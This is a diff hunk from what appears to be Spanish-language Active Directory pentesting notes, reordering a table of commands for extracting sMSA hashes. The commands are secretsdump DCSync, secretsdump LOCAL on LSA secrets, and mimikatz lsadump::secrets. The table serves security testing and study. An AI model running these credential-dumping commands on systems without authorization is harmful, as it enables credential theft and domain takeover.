@@ -48,7 +48,7 @@ Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-ManagedServiceAccount"} \
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `secretsdump.py corp.local/admin:pass@<DC> -just-dc-user '<smsa>$'` | DCSync sMSA hash (priv) | Privileged dump. |
-| Compromise host bound a sMSA | `secretsdump LOCAL` extrae hash desde LSA secrets | Computer compromise path. |
+| `secretsdump LOCAL` extrae hash desde LSA secrets | Compromise host bound a sMSA | Computer compromise path. |
 | `mimikatz: lsadump::secrets` | LSA Secrets (incluye sMSA) | Local DA. |
 ^ad-smsa-read
 
